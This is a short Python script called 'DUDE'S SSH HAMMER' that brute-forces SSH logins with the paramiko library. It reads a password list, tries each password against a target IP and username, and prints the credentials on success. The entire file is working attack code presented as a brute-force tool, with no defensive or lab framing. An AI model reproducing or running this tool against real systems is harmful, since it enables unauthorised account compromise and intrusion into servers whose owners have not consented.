import paramiko
import sys
import time

# DUDE'S SSH HAMMER
# Brute force tool for SSH entry.

def dude_hammer(target, username, password_list):
    print(f"[*] DUDE: Hammering {target} as {username}...")
    
    with open(password_list, 'r') as f:
        for password in f.read().splitlines():
            password = password.strip()
            try:
                print(f"[?] DUDE: Testing: {password}", end="\r")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password, timeout=2)
                
                print(f"\n[!] DUDE: ACCESS GRANTED!")
                print(f"[!] DUDE: Target: {target}")
                print(f"[!] DUDE: User: {username}")
                print(f"[!] DUDE: Pass: {password}")
                
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                # print(f"\n[X] DUDE Error: {e}")
                pass
    
    print("\n[-] DUDE: Hammering failed. No valid password found.")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 dude_ssh_hammer.py <ip> <user> <passlist>")
    else:
        dude_hammer(sys.argv[1], sys.argv[2], sys.argv[3])
